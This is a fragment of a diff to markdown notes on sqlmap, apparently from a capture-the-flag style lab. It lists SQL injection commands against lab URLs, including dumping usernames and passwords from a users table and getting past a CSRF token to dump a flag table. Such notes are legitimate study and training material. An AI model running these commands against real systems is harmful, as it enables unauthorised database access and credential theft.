@@ -12,6 +12,10 @@ sqlmap -u "http://154.57.164.61:31255/case6.php?col=id" --prefix='`)' --no-cast 
 
 # dump specific user
 sqlmap -u "http://154.57.164.82:30425/case1.php?id=1" -D testdb -T users -C name,password --dump --where="name LIKE 'Kimberly%'" --batch 
+
+# CSRF bypass
+# Craft POST request manually like id=1&token=12347 in req.txt
+sqlmap -r req.txt --csrf-token="t0ken" --batch -D testdb -T flag8 --dump
 ```
 
 ## HTTP Request Type
